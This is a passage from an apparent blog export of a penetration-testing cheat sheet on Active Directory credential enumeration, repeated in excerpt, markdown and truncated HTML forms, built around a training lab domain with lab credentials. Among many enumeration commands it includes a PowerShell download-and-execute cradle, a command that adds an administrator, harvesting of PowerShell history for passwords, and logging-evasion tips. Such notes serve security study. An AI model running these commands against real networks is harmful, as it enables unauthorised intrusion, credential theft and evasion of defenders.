WMI checks**\n    \n| Command | Description |\n| --- | --- |\n| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patch level and description of the Hotfixes applied |\n| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List | Displays basic host information to include any attributes within the list |\n| wmic process list /format:list | A listing of all processes on host |\n| wmic ntdomain list /format:list | Displays information about the Domain and Domain Controllers |\n| wmic useraccount list /format:list | Displays information about all local accounts and any domain accounts that have logged into the device |\n wmic group list /format:list | Information about all local groups |\n| wmic sysaccount list /format:list | Dumps information about any system accounts that are being used as service accounts. |\n    \nThis [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.\n    \n### Net Commands\n    \nAre useful when enumerating information from the domain, these commands can be used to query the [localhost] and remote hosts.\n    \n| Command | Description |\n| --- | --- |\n| net accounts | Information about password requirements |\n| net accounts /domain | Password and lockout policy |\n| net group /domain | Information about domain groups |\n| net group \"Domain Admins\" /domain | List users with domain admin privileges |\n| net group \"domain computers\" /domain | List of PCs connected to the domain |\n| net group \"Domain Controllers\" /domain | List PC accounts of domains controllers |\n| net group <domain_group_name> /domain | User that belongs to the group |\n| net groups /domain | List of domain groups |\n| net localgroup | All available groups |\n| net localgroup administrators /domain | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |\n| net localgroup Administrators | Information about a group (admins) |\n| net localgroup administrators [username] /add | Add user to administrators |\n| net share | Check current shares |\n| net user <ACCOUNT_NAME> /domain | Get information about a user within the domain |\n| net user /domain | List all users of the domain |\n| net user %username% | Information about the current user |\n| net use x: \\computer\\share | Mount the share locally |\n| net view | Get a list of computers |\n| net view /all /domain[:domainname] | Shares on the domains |\n| net view \\computer /ALL | List shares of a computer |\n| net view /domain | List of PCs of the domain |\n    \n## Net Command Tip.\n    \nIf you are in an environment where network defenders are actively logging/looking for any commands out of the normal you can try typing **********************net1********************** instead of the ********net******** to work out using the net command.\n    \n## Dsquery \n    \nA command-line tool that can be used to find Active Directory objects, the queries run with dsquery can be replicated with Bloodhound and Powerview, but one may not have access to those tools.\n    \n****Dsquery**** will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\\Windows\\System32\\dsquery.dll`\n\nA long read but worthy to check up on those commands one might not remember ...","source":"_posts/active-directory/ad-credential-enumeration.md","raw":"---\ntitle: \"AD CRED ENUM\"\ndate: 2023-08-09\ndraft: false\ntags: [\"Active-Directory\"]\ndescription: \"Active Directory credential enumeration\"\ntop_img: /images/cyberpunk-red.jpg\n---\n\n![](https://miro.medium.com/v2/resize:fit:750/0*Kz1iA9w7Ciywdu1A.jpg)\n\n## Credential Enumeration\n\nAfter acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:\n- Domain users\n- Computer Attributes\n- group membership\n- Group Policy Objects\n- Permissions\n- ACLs\n- Trusts\n\nbut not limited to the above, but the most **important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level.**\n            \nSo at a minimum, you need to have acquired a user’s cleartext password, NTLM password hash or SYSTEM access on a domain-joined host.\n            \n## CrackMapExec.\n\nThis tool can be used to assess AD environments, where it utilizes packages from the impacket and powersploit toolkit to perform its functions.\n            \n### Domain UserEnum\n            \nWhen enumerating you need to point CME to the Domain Controller, using creds that you retrieved you can list out domain users, it is noted that CME provides a **********badPwdCount********** attribute which is helpful when performing targeted pass spraying or building a target users list filtered out with user badPwdCount attribute that’s above 0 to be careful not to lock out accounts.\n            \n`sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --users`\n            \n### Domain Group Enum\n            \nWe can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.\n            \n`sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx`  `--groups` \n            \nWe can begin to note down groups of interest. Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups likely contain users with elevated privileges worth targeting during our assessment.\n            \n## Smbmap\n            \nA tool for enumerating SMB shares from a Linux environment can be used to list shares, permissions and share content. \n            \n### recursive list Dirs in Shares\n            \n`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only`\n            \n## RpcClient\n            \nUsed to enumerate, add, change and even remove objects from AD.\n            \n### Enumeration \n            \n[Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier utilized to track and identify objects, for example:\n            \n- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.\n\n- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.\n\n- So the domain user `htb-student` with a RID:[0x457] Hex 0x457 would = decimal `1111`, will have a full user SID of `S-1-5-21-3842939050-3880317879-2865463114-1111`.\n\n- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.\n            \nSome accounts will have the same RID regardless of what host you are on, built-in admin accounts for domains will have **500** or **0x1f4** this value is unique to an object hence we can use it to enumerate further info from the domain.\n            \n## Impacket-Toolkit\n\nimpacket is a versatile toolkit which gives different ways to enumerate, interact and exploit Windows protocols and find the information needed using Python. \n            \n### Psexec.py\n            \nA clone of sysinternals psexec executable works by creating a remote service by uploading a randomly-named executable to the ADMIN$ shares on the target host and registers the service via RPC and the Windows services control manager.\n            \nOnce comms are established it provides a shell as a SYSTEM on the victim host.\n            \n### windapsearch\n            \n[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries, we can also perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The `--da`(enumerate domain admins group members ) option and the `-PU`( find privileged users) options. The `-PU` option is interesting because it will perform a recursive search for users with nested group membership.\n            \n### Domain-Admins\n            \n`python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da`\n            \nThis enumerates Domain Admin Groups.\n            \n### Privileged Users\n            \nChecking for potential users, using **-PU** with elevated privileges that may have gone unnoticed.\n            \n**N/B This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.**\n            \n`python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU`\n            \n## BloodHound\n            \nOnce you have the domain credentials, you can run [BloodHound.py](https://github.com/fox-it/BloodHound.py) a tool for auditing Active Directory where it takes large amounts of data that would be time-consuming to sift through and create a GUI representation or “attack paths” of where access with a particular user may lead.\n            \n- ### Windows\n        \nAt this point, we are interested in other misconfiguration and permission issues that could lead to lateral and vertical movement, getting the bigger picture of how the domain is setup\n        \n- Do any trusts exist with other domains both inside & outside the current forest?\n- Files shares that our user has access to.\n\n## ActiveDirectory Powershell Modules\n\nThese are groups of Powershell cmdlets for enumerating AD environments.\n        \n`Get-ADDomain` - Print out domain SID, domain functional level, and child domains.\n        \n`Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName` This will filter ACC with the **serviceprincipalname** property populated and also get us a listing ACC that may be susceptible to kerberos attacks.\n        \n`Get-ADTrust -Filter *` - prints out any trust relationship the domain has, it’s useful when looking at how to take advantage of the child-to-parent trust relationship and attack across forest trusts.\n        \n`Get-ADGroup -Filter * | select name` - Group enumeration\n        \n`Get-ADGroup -Identity \"Backup Operators\"` - Detailed Group Info\n        \n`Get-ADGroupMember -Identity \"Backup Operators\"` - Getting Group Membership\n        \n## Powerview\n        \nIt identifies where users are logged in on a network, enumerates domain info such as users, computers, groups, ACLs, and trusts, hunts for file shares and passwords, performs Kerberoasting and more.\n        \nIt gives an insight into the security posture of the target domain. \n        \n- ### commands\n          \n            \n| Command | Description |\n| --- | --- |\nExport-PowerViewCSV | Append results to a CSV file |\nConvertTo-SID | Convert a User or group name to its SID value \n| Get-DomainSPNTicket | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account |\n**Domain/LDAP Functions**\n| Get-Domain | Will return the AD object for the current (or specified) domain |\n| Get-DomainController | Return a list of the Domain Controllers for the specified domain |\n| Get-DomainUser | Will return all users or specific user objects in AD |\n Get-DomainComputer | Will return all computers or specific computer objects in AD |\n| Get-DomainGroup | Will return all groups or specific group objects in AD |\n| Get-DomainOU | Search for all or specific OU objects in AD |\n Find-InterestingDomainAcl | Finds object ACLs in the domain with modification rights set to non-built in objects |\n| Get-DomainGroupMember | Will return the members of a specific domain group |\n| Get-DomainFileServer | Returns a list of servers likely functioning as file servers |\n| Get-DomainDFSShare | Returns a list of all distributed file systems for the current (or specified) domain |\n| GPO Functions: |  |\n| Get-DomainGPO | Will return all GPOs or specific GPO objects in AD |\n| Get-DomainPolicy | Returns the default domain policy or the domain controller policy for the current domain |\n| **Computer Enumeration Functions**: \n| Get-NetLocalGroup | Enumerates local groups on the local or a remote machine |\n| Get-NetLocalGroupMember | Enumerates members of a specific local group |\nGet-NetShare | Returns open shares on the local (or a remote) machine |\n| Get-NetSession | Will return session information for the local (or a remote) machine |\n| Test-AdminAccess | Tests if the current user has administrative access to the local (or a remote) machine |\n**Threaded 'Meta'-Functions**\n| Find-DomainUserLocation | Finds machines where specific users are logged in |\n| Find-DomainShare | Finds reachable shares on domain machines |\n| Find-InterestingDomainShareFile | Searches for files matching specific criteria on readable shares in the domain |\n| Find-LocalAdminAccess | Find machines on the local domain where the current user has local administrator access |\n| **Domain Trust Functions** |  |\n| Get-DomainTrust | Returns domain trusts for the current domain or a specified domain |\n| Get-ForestTrust | Returns all forest trusts for the current forest or a specified forest |\n| Get-DomainForeignUser | Enumerates users who are in groups outside of the user's domain |\n| Get-DomainForeignGroupMember | Enumerates groups with users outside of the group's domain and returns each foreign member |\n| Get-DomainTrustMapping | Will enumerate all trusts for the current domain and any others seen. |\n        \n**Domain User Info**        \n\n`Get-DomainUser -Identity morgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname, description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol`\n        \n******Recursive Group Membership******\n        \n`Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse` - retrieve group-specific information and recurse which means if it finds any groups that are part of the target group (******nested group membership******) to list out the members of those groups.\n        \n************************************Trust Enumeration.************************************\n        \n`Get-DomainTrustMapping` test for local admin access on either the current machine or the remote one.\n        \n**********************************Testing for Local Admin Access********************************** \n        \n`Test-AdminAccess -ComputerName ACADEMY-EA-MS01`\n        \n********************************Users with SPN Set********************************\n        \n`Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`\n        \n## Shares\n        \nAllows users on the domain to quickly access info relevant to their daily roles and share content with their organization. \n        \n### Snaffler\n        \n A tool that helps in acquiring credentials or other sensitive data in AD, works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.\n        \n## Living off the Land\n    \nDiscussion on Techniques for utilizing native Windows tools to perform our enumeration is considered a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network.\n    \nMost enterprise environments have network monitoring and logging, including IDS/IPS, firewalls and passive sensors and tools on top of their host-based defences Windows Defender or enterprise EDR.\n    \n### Env Enumeration Host & Network Recon\n    \n| Command | Result |\n| --- | --- |\n| hostname | Prints the PC's Name |\n| [System.Environment]::OSVersion.Version | Prints out the OS version and revision level |\n| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patches and hotfixes applied to the host |\n| ipconfig /all | Prints out network adapter state and configurations |\n| set %USERDOMAIN% | Displays the domain name to which the host belongs (ran from CMD-prompt) |\n| set %logonserver% | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |\n    \n## Powershell\n    \nIt provides an extensive framework for administering all facets of Windows systems and AD Environments, can be used to dig deep into systems and can be used on engagements to recon the host and network and send and receive files.\n    \n| Cmd-Let | Description |\n| --- | --- |\n| Get-Module | Lists available modules loaded for use. |\n| Get-ExecutionPolicy -List | Will print the https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2 settings for each scope on a host. |\n| Set-ExecutionPolicy Bypass -Scope Process | This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |\n| Get-Content C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |\n| Get-ChildItem Env: | ft Key, Value | Return environment values such as key paths, users, computer information, etc. |\n| powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>\" | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |\n    \n## OPSec Tactics\n    \nA few Operational security tactics that defenders are unaware of are that several versions of Powershell often exist on a host. If not uninstalled, they can still be used.\n    \n### Example\n    \n> Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while utilizing resources built into the hosts to our advantage.\n\n### Checking Defenses.\n    \nThese few commands will utilize the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) to help get an understanding of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.\n    \nFirewall check - `netsh advfirewall show allprofiles`\n    \nDefender check cmd - `sc query windefend`\n    \nChecking the status and configuration settings - `Get-MpComputerStatus`\n    \n## Am I Alone?\n    \nWhen landing on a host for the first time, it's important to check and see if you are the only one logged in since if you take certain actions from a host someone else is logged on, there is potential for them to identify you.\n    \nIf a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.\n    \n### Network Enumeration\n            \n| Networking Commands | Description |\n| --- | --- |\n| arp -a | Lists all known hosts stored in the arp table. |\n| ipconfig /all | Prints out adapter settings for the host. We can figure out the network segment from here. |\n| route print | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |\n| netsh advfirewall shows state | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |\n    \n### Windows Management Instrumentation (WMI)\n\n This scripting engine is used within Windows enterprises to retrieve info and run admin tasks on local and remote hosts.\n    \n**Quick WMI checks**\n    \n| Command | Description |\n| --- | --- |\n| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patch level and description of the Hotfixes applied |\n| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List | Displays basic host information to include any attributes within the list |\n| wmic process list /format:list | A listing of all processes on host |\n| wmic ntdomain list /format:list | Displays information about the Domain and Domain Controllers |\n| wmic useraccount list /format:list | Displays information about all local accounts and any domain accounts that have logged into the device |\n wmic group list /format:list | Information about all local groups |\n| wmic sysaccount list /format:list | Dumps information about any system accounts that are being used as service accounts. |\n    \nThis [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.\n    \n### Net Commands\n    \nAre useful when enumerating information from the domain, these commands can be used to query the [localhost] and remote hosts.\n    \n| Command | Description |\n| --- | --- |\n| net accounts | Information about password requirements |\n| net accounts /domain | Password and lockout policy |\n| net group /domain | Information about domain groups |\n| net group \"Domain Admins\" /domain | List users with domain admin privileges |\n| net group \"domain computers\" /domain | List of PCs connected to the domain |\n| net group \"Domain Controllers\" /domain | List PC accounts of domains controllers |\n| net group <domain_group_name> /domain | User that belongs to the group |\n| net groups /domain | List of domain groups |\n| net localgroup | All available groups |\n| net localgroup administrators /domain | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |\n| net localgroup Administrators | Information about a group (admins) |\n| net localgroup administrators [username] /add | Add user to administrators |\n| net share | Check current shares |\n| net user <ACCOUNT_NAME> /domain | Get information about a user within the domain |\n| net user /domain | List all users of the domain |\n| net user %username% | Information about the current user |\n| net use x: \\computer\\share | Mount the share locally |\n| net view | Get a list of computers |\n| net view /all /domain[:domainname] | Shares on the domains |\n| net view \\computer /ALL | List shares of a computer |\n| net view /domain | List of PCs of the domain |\n    \n## Net Command Tip.\n    \nIf you are in an environment where network defenders are actively logging/looking for any commands out of the normal you can try typing **********************net1********************** instead of the ********net******** to work out using the net command.\n    \n## Dsquery \n    \nA command-line tool that can be used to find Active Directory objects, the queries run with dsquery can be replicated with Bloodhound and Powerview, but one may not have access to those tools.\n    \n****Dsquery**** will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\\Windows\\System32\\dsquery.dll`\n\nA long read but worthy to check up on those commands one might not remember ...","slug":"active-directory/ad-credential-enumeration","published":1,"updated":"2024-07-16T20:36:04.847Z","_id":"clyouz1ir0005wgjn0asmeg2l","comments":1,"layout":"post","photos":[],"content":"<p><img src=\"https://miro.medium.com/v2/resize:fit:750/0*Kz1iA9w7Ciywdu1A.jpg\"></p>\n<h2 id=\"Credential-Enumeration\"><a href=\"#Credential-Enumeration\" class=\"headerlink\" title=\"Credential Enumeration\"></a>Credential Enumeration</h2><p>After acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:</p>\n<ul>\n<li>Domain users</li>\n<li>Computer Attributes</li>\n<li>group membership</li>\n<li>Group Policy Objects</li>\n<li>Permissions</li>\n<li>ACLs</li>\n<li>Trusts</li>\n</ul>\n<p>but not limited to the above, but the most <strong>important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level.</strong></p>\n<p>So at a minimum, you need to have acquired a user’s cleartext password, NTLM password hash or SYSTEM access on a domain-joined host.</p>\n<h2 id=\"CrackMapExec\"><a href=\"#CrackMapExec\" class=\"headerlink\" title=\"CrackMapExec.\"></a>CrackMapExec.</h2><p>This tool can be used to assess AD environments, where it utilizes packages from the impacket and powersploit toolkit to perform its functions.</p>\n<h3 id=\"Domain-UserEnum\"><a href=\"#Domain-UserEnum\" class=\"headerlink\" title=\"Domain UserEnum\"></a>Domain UserEnum</h3><p>When enumerating you need to point CME to the Domain Controller, using creds that you retrieved you can list out domain users, it is noted that CME provides a <strong><strong><strong><strong><strong>badPwdCount</strong></strong></strong></strong></strong> attribute which is helpful when performing targeted pass spraying or building a target users list filtered out with user badPwdCount attribute that’s above 0 to be careful not to lock out accounts.</p>\n<p><code>sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --users</code></p>\n<h3 id=\"Domain-Group-Enum\"><a href=\"#Domain-Group-Enum\" class=\"headerlink\" title=\"Domain Group Enum\"></a>Domain Group Enum</h3><p>We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.</p>\n<p><code>sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx</code>  <code>--groups</code> </p>\n<p>We can begin to note down groups of interest. Take note of key groups like <code>Administrators</code>, <code>Domain Admins</code>, <code>Executives</code>, any groups that may contain privileged IT admins, etc. These groups likely contain users with elevated privileges worth targeting during our assessment.</p>\n<h2 id=\"Smbmap\"><a href=\"#Smbmap\" class=\"headerlink\" title=\"Smbmap\"></a>Smbmap</h2><p>A tool for enumerating SMB shares from a Linux environment can be used to list shares, permissions and share content. </p>\n<h3 id=\"recursive-list-Dirs-in-Shares\"><a href=\"#recursive-list-Dirs-in-Shares\" class=\"headerlink\" title=\"recursive list Dirs in Shares\"></a>recursive list Dirs in Shares</h3><p><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#39;Department Shares&#39; --dir-only</code></p>\n<h2 id=\"RpcClient\"><a href=\"#RpcClient\" class=\"headerlink\" title=\"RpcClient\"></a>RpcClient</h2><p>Used to enumerate, add, change and even remove objects from AD.</p>\n<h3 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h3><p><a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers\">Relative Identifier (RID)</a> is a unique identifier utilized to track and identify objects, for example:</p>\n<ul>\n<li><p>The <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers\">SID</a> for the INLANEFREIGHT.LOCAL domain is: <code>S-1-5-21-3842939050-3880317879-2865463114</code>.</p>\n</li>\n<li><p>When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.</p>\n</li>\n<li><p>So the domain user <code>htb-student</code> with a RID:[0x457] Hex 0x457 would &#x3D; decimal <code>1111</code>, will have a full user SID of <code>S-1-5-21-3842939050-3880317879-2865463114-1111</code>.</p>\n</li>\n<li><p>This is unique to the <code>htb-student</code> object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.</p>\n</li>\n</ul>\n<p>Some accounts will have the same RID regardless of what host you are on, built-in admin accounts for domains will have <strong>500</strong> or <strong>0x1f4</strong> this value is unique to an object hence we can use it to enumerate further info from the domain.</p>\n<h2 id=\"Impacket-Toolkit\"><a href=\"#Impacket-Toolkit\" class=\"headerlink\" title=\"Impacket-Toolkit\"></a>Impacket-Toolkit</h2><p>impacket is a versatile toolkit which gives different ways to enumerate, interact and exploit Windows protocols and find the information needed using Python. </p>\n<h3 id=\"Psexec-py\"><a href=\"#Psexec-py\" class=\"headerlink\" title=\"Psexec.py\"></a>Psexec.py</h3><p>A clone of sysinternals psexec executable works by creating a remote service by uploading a randomly-named executable to the ADMIN$ shares on the target host and registers the service via RPC and the Windows services control manager.</p>\n<p>Once comms are established it provides a shell as a SYSTEM on the victim host.</p>\n<h3 id=\"windapsearch\"><a href=\"#windapsearch\" class=\"headerlink\" title=\"windapsearch\"></a>windapsearch</h3><p><a href=\"https://github.com/ropnop/windapsearch\">Windapsearch</a> is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries, we can also perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The <code>--da</code>(enumerate domain admins group members ) option and the <code>-PU</code>( find privileged users) options. The <code>-PU</code> option is interesting because it will perform a recursive search for users with nested group membership.</p>\n<h3 id=\"Domain-Admins\"><a href=\"#Domain-Admins\" class=\"headerlink\" title=\"Domain-Admins\"></a>Domain-Admins</h3><p><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</code></p>\n<p>This enumerates Domain Admin Groups.</p>\n<h3 id=\"Privileged-Users\"><a href=\"#Privileged-Users\" class=\"headerlink\" title=\"Privileged Users\"></a>Privileged Users</h3><p>Checking for potential users, using <strong>-PU</strong> with elevated privileges that may have gone unnoticed.</p>\n<p><strong>N&#x2F;B This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.</strong></p>\n<p><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</code></p>\n<h2 id=\"BloodHound\"><a href=\"#BloodHound\" class=\"headerlink\" title=\"BloodHound\"></a>BloodHound</h2><p>Once you have the domain credentials, you can run <a href=\"https://github.com/fox-it/BloodHound.py\">BloodHound.py</a> a tool for auditing Active Directory where it takes large amounts of data that would be time-consuming to sift through and create a GUI representation or “attack paths” of where access with a particular user may lead.</p>\n<ul>\n<li><h3 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h3></li>\n</ul>\n<p>At this point, we are interested in other misconfiguration and permission issues that could lead to lateral and vertical movement, getting the bigger picture of how the domain is setup</p>\n<ul>\n<li>Do any trusts exist with other domains both inside &amp; outside the current forest?</li>\n<li>Files shares that our user has access to.</li>\n</ul>\n<h2 id=\"ActiveDirectory-Powershell-Modules\"><a href=\"#ActiveDirectory-Powershell-Modules\" class=\"headerlink\" title=\"ActiveDirectory Powershell Modules\"></a>ActiveDirectory Powershell Modules</h2><p>These are groups of Powershell cmdlets for enumerating AD environments.</p>\n<p><code>Get-ADDomain</code> - Print out domain SID, domain functional level, and child domains.</p>\n<p><code>Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName</code> This will filter ACC with the <strong>serviceprincipalname</strong> property populated and also get us a listing ACC that may be susceptible to kerberos attacks.</p>\n<p><code>Get-ADTrust -Filter *</code> - prints out any trust relationship the domain has, it’s useful when looking at how to take advantage of the child-to-parent trust relationship and attack across forest trusts.</p>\n<p><code>Get-ADGroup -Filter * | select name</code> - Group enumeration</p>\n<p><code>Get-ADGroup -Identity &quot;Backup Operators&quot;</code> - Detailed Group Info</p>\n<p><code>Get-ADGroupMember -Identity &quot;Backup Operators&quot;</code> - Getting Group Membership</p>\n<h2 id=\"Powerview\"><a href=\"#Powerview\" class=\"headerlink\" title=\"Powerview\"></a>Powerview</h2><p>It identifies where users are logged in on a network, enumerates domain info such as users, computers, groups, ACLs, and trusts, hunts for file shares and passwords, performs Kerberoasting and more.</p>\n<p>It gives an insight into the security posture of the target domain. </p>\n<ul>\n<li><h3 id=\"commands\"><a href=\"#commands\" class=\"headerlink\" title=\"commands\"></a>commands</h3></li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Export-PowerViewCSV</td>\n<td>Append results to a CSV file</td>\n</tr>\n<tr>\n<td>ConvertTo-SID</td>\n<td>Convert a User or group name to its SID value</td>\n</tr>\n<tr>\n<td>Get-DomainSPNTicket</td>\n<td>Requests the Kerberos ticket for a specified Service Principal Name (SPN) account</td>\n</tr>\n<tr>\n<td><strong>Domain&#x2F;LDAP Functions</strong></td>\n<td></td>\n</tr>\n<tr>\n<td>Get-Domain</td>\n<td>Will return the AD object for the current (or specified) domain</td>\n</tr>\n<tr>\n<td>Get-DomainController</td>\n<td>Return a list of the Domain Controllers for the specified domain</td>\n</tr>\n<tr>\n<td>Get-DomainUser</td>\n<td>Will return all users or specific user objects in AD</td>\n</tr>\n<tr>\n<td>Get-DomainComputer</td>\n<td>Will return all computers or specific computer objects in AD</td>\n</tr>\n<tr>\n<td>Get-DomainGroup</td>\n<td>Will return all groups or specific group objects in AD</td>\n</tr>\n<tr>\n<td>Get-DomainOU</td>\n<td>Search for all or specific OU objects in AD</td>\n</tr>\n<tr>\n<td>Find-InterestingDomainAcl</td>\n<td>Finds object ACLs in the domain with modification rights set to non-built in objects</td>\n</tr>\n<tr>\n<td>Get-DomainGroupMember</td>\n<td>Will return the members of a specific domain group</td>\n</tr>\n<tr>\n<td>Get-DomainFileServer</td>\n<td>Returns a list of servers likely functioning as file servers</td>\n</tr>\n<tr>\n<td>Get-DomainDFSShare</td>\n<td>Returns a list of all distributed file systems for the current (or specified) domain</td>\n</tr>\n<tr>\n<td>GPO Functions:</td>\n<td></td>\n</tr>\n<tr>\n<td>Get-DomainGPO</td>\n<td>Will return all GPOs or specific GPO objects in AD</td>\n</tr>\n<tr>\n<td>Get-DomainPolicy</td>\n<td>Returns the default domain policy or the domain controller policy for the current domain</td>\n</tr>\n<tr>\n<td><strong>Computer Enumeration Functions</strong>:</td>\n<td></td>\n</tr>\n<tr>\n<td>Get-NetLocalGroup</td>\n<td>Enumerates local groups on the local or a remote machine</td>\n</tr>\n<tr>\n<td>Get-NetLocalGroupMember</td>\n<td>Enumerates members of a specific local group</td>\n</tr>\n<tr>\n<td>Get-NetShare</td>\n<td>Returns open shares on the local (or a remote) machine</td>\n</tr>\n<tr>\n<td>Get-NetSession</td>\n<td>Will return session information for the local (or a remote) machine</td>\n</tr>\n<tr>\n<td>Test-AdminAccess</td>\n<td>Tests if the current user has administrative access to the local (or a remote) machine</td>\n</tr>\n<tr>\n<td><strong>Threaded ‘Meta’-Functions</strong></td>\n<td></td>\n</tr>\n<tr>\n<td>Find-DomainUserLocation</td>\n<td>Finds machines where specific users are logged in</td>\n</tr>\n<tr>\n<td>Find-DomainShare</td>\n<td>Finds reachable shares on domain machines</td>\n</tr>\n<tr>\n<td>Find-InterestingDomainShareFile</td>\n<td>Searches for files matching specific criteria on readable shares in the domain</td>\n</tr>\n<tr>\n<td>Find-LocalAdminAccess</td>\n<td>Find machines on the local domain where the current user has local administrator access</td>\n</tr>\n<tr>\n<td><strong>Domain Trust Functions</strong></td>\n<td></td>\n</tr>\n<tr>\n<td>Get-DomainTrust</td>\n<td>Returns domain trusts for the current domain or a specified domain</td>\n</tr>\n<tr>\n<td>Get-ForestTrust</td>\n<td>Returns all forest trusts for the current forest or a specified forest</td>\n</tr>\n<tr>\n<td>Get-DomainForeignUser</td>\n<td>Enumerates users who are in groups outside of the user’s domain</td>\n</tr>\n<tr>\n<td>Get-DomainForeignGroupMember</td>\n<td>Enumerates groups with users outside of the group’s domain and returns each foreign member</td>\n</tr>\n<tr>\n<td>Get-DomainTrustMapping</td>\n<td>Will enumerate all trusts for the current domain and any others seen.</td>\n</tr>\n</tbody></table>\n<p><strong>Domain User Info</strong>        </p>\n<p><code>Get-DomainUser -Identity morgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname, description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol</code></p>\n<p><strong><strong><strong>Recursive Group Membership</strong></strong></strong></p>\n<p><code>Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code> - retrieve group-specific information and recurse which means if it finds any groups that are part of the target group (<strong><strong><strong>nested group membership</strong></strong></strong>) to list out the members of those groups.</p>\n<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Trust 